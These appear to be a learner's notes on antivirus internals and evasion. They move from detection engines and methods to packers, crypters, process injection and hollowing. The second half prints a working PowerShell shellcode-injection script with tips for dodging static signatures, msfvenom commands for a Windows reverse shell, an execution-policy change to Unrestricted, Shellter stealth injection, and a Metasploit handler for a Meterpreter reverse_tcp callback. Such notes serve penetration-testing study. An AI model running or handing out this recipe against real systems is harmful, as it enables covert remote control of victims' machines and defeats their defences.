# Known vs unknown threats

# 

# signature based detection: di malware

# generic file hash to specific binary sequence

# 

# AV comprises different engines responsible for detecting running application in system

# 

# Signature language defined in AV, signature can represent different aspect of malware

# 

# Modern AV solutions are shipped with a ML engine and is ran whenever an unknown file is discovered on a system

# 

# ML engines can detect unknown threats, but they operate on the cloud and need an active network connection to internet which is not an option for some internal enterprise servers

# 

# many engines shouldn't borrow too many computing resources from the rest of the system limiting it's potency

# 

# Endpoint Detection and Response solutions have evoveld

# SEIM event management

# 

# 

# AV engine components

# 

# signature updates fetched fromthe vendor's signature db 

# 

# signature definitions are stored in the localAV database which feeds more specific engines

# 

# AV is designed around:

# File Engine

# Memory Engine

# Network Engine

# Disassembler

# Emulator/Sandbox

# Browser Plugin

# Machine Learning Engine

# 

# they work simultaneously with signature db to rank events 

# 

# file engine: scheduled and real time scans

# scheduled: parses the file system and sends metadata && data to signature engine

# real-time scan: ID envents at the kernel level via mini-filter driver (operates at kernel and user land)

# 

# memory engine inspects each process memory space at runtime for well-known binary signatures or API calls

# 

# network engine inspects the traffic on LAN interface, firewall

# 

# malware employs encryption and decryption through custom routines to conceal -> AV counterattack by disassembling malware packers or ciphers and loading into sandbox

# 

# disassembler engine: translating machine code into assembly, reconstructing original program code section and id any encoding/decoding routine

# 

# browsers are protected by sandbox, modern AV often employ browser plugins to get better visibility and detect malicous content

# 

# 

# Detection Methods

# 

# Signature based 

# 

# restricted list technology -> scan compare quarantine

# 

# can be hash or a set of multiple patterns like binary values

# 

# we can get the binary representation of a file via xxd with -b before file name

# 

# Heuristic based: rules and algorithms to determine if action is malicious

# 

# stepping though the instruction of binary file by attempting to disassemble the machine code and decompile & analyze the source code to map program, looking for patterns

# 

# Behaviour-Based dynamically analyze the behaviour of binary file, exe in sandbox

# 

# ML detect unknown threat, collection and analysis of additional metdata.

# 

# MS WD has 2 WL, client which is creating ML models and heuristics

# cloud, which is capable od analyzing submitted samples aginst a metadata based model comprised of all submitted samples

# 

# if client can't determine, it will query cloud

# 

# many AV use a combination of these detection methods to achieve higher detection rates

# 

# 

# 

# ByPassing

# 

# On-Disk:

# 

# packers:

# high cost of disk space and slow network speeds during early days of the internet

# 

# packers alone is no longer enough to evade AV

# 

# Obfuscators reorganize and mutate code to make it difficult to reverse engineer

# 

# replacing instructions with semantically equivalent ones, inserting irrelevant instructions or dead code

# 

# splitting or reordering functions and so on

# 

# Crypter software: cryptographically alters exe code,adding decryption stub that restores original code upon exe, decryption happens in memory, only encrypted code is on disk, foundational in modern malware, most effective technique

# 

# high effective av evation requires combination of all techniques in addition to advanced ones:

# anti-reversing, antidebugging, virtual machine emulation detection ...

# software protectors were designed for leditimate copy right purpose but can be used to bypass AV

# 

# The Enigma Protector can be used to successfully bypass antivirus products

# 

# 

# In Memory Evasion

# 

# In memory injections, PE injection, by pass av products on windows, manipulation of volatile memory, doesn't write file to disk which is always patroiled

# 

# Remote Process Memory Injection: inject payload into another valid PE that is not malicious

# Using windows API

# OpenProcess function to obtain valid HANDLE to a target process we can access

# Allocate memory in the context of process by calling Windows API such as VirtualAllocEx

# Once memory has been allocated, we copy the malicious payload to newly allocated memory using WriteProcessMemory  -> exe in memory in seprarte thread using CreateRemoteThread API

# 

# 

# Unlike regular DLL injection, loading a malicious DLL from disk using LoadLibrary API,

# 

# reflective DLL injection load DLL stored by attacker in process memory

# 

# LoadLibrary does not support loading DLL from memory, win os doesn't expose API that can handel this either we must write our own API that doesn't rely on disk based dll

# 

# Process Hollowing,launch non-malicious process in suspended state, image of the process is removec from memory and replaced with malicious executable image

# 

# Inline hooking, moding memory and introducing hook (instruction that redirects code exe) into function to point it to malicous code

# (finding JMP ESP)

# 

# 

# Testing for AV Evasion

# 

# SecOps collaboration between enterprise IT and SOC

# 

# Kleenscan.com alternative to VirusTotal last resort if AV is grey -> black

# 

# need to disable sample submssion so that we don't incur drawback as VirusTotal

# 

# always perfer custom code

# 

# 

# Evading AV with Thread Injection

# 

# using remote process memory injection technique

# 

# below is well known version of memory injection powershell script

# 

# ```
powershell
$code = '

# [DllImport("kernel32.dll")]

# public static extern IntPtr VirtualAlloc(IntPtr lpAddress, uint dwSize, uint flAllocationType, uint flProtect);

# 

# [DllImport("kernel32.dll")]

# public static extern IntPtr CreateThread(IntPtr lpThreadAttributes, uint dwStackSize, IntPtr lpStartAddress, IntPtr lpParameter, uint dwCreationFlags, IntPtr lpThreadId);

# 

# [DllImport("msvcrt.dll")]

# public static extern IntPtr memset(IntPtr dest, uint src, uint count);';
```

# 

# $var2 = 

#   Add-Type -memberDefinition $code -Name "iWin32" -namespace Win32Functions -passthru;

# 

# [Byte[]];

# [Byte[]]$var1 = <place your shellcode here>;

# 

# $size = 0x1000;

# 

# if ($var1.Length -gt 0x1000) {$size = $var1.Length};

# 

# $x = $var2::VirtualAlloc(0,$size,0x3000,0x40);

# 

# for ($i=0;$i -le ($var1.Length-1);$i++) {$var2::memset([IntPtr]($x.ToInt32()+$i), $var1[$i], 1)};

# 

# $var2::CreateThread(0,0,$x,0,0,0);for (;;) { Start-sleep 60 };

# 

# payload generation:

# ```
msfvenom -p windows/shell_reverse_tcp LHOST=<ip> LPORT=4444 -f powershell -v sc
```

# 

# script starts by importing:

# VirtualAlloc and CreateThread from kernel32.dll && memset from msvcrt.dll so we can allocate mem, exe threading && write to memory

# 

# script main logic:

# allocating memory using VirtualAlloc, which takes payload in $sc array and writes it to new block using memset

# 

# 

# 

# scripts are just text files, harder to interprete compared to binary for AV

# 

# we can try to by pass detection of static strings by changing the variables to more generic names

# 

# saving the script as ps1 (powershell file) 

# 

# most win systems disables running script

# 

# ```
Get-ExecutionPolicy - Scope CurrentUser
```

# retrieve current exe policy

# 

# ```
Set-ExecutionPolicy -ExecutionPolicy Unrestricted -Scope CurrentUser
```

# set exe policy so we can run script

# 

# 

# Automating the Process

# 

# Shellter dynamic shellcode injection, free

# 

# analysis of the target PE file and the exe path, determin where it can inject without reelying on traditional injection techniques

# 

# using existing PE importing address table enties to locate functions that will be used for mem allocation

# 

# Shellter is designed tobe run on windows, need to use wine

# 

# auto mode

# 

# enable stealth mode if you want the applciation to return to normal function

# 

# ```
msfconsole -x "use exploit/multi/handler;set payload windows/meterpreter/reverse_tcp;set LHOST 192.168.50.1;set LPORT 443;run;"
```

# 

# above command to interact with Meterpreter payload
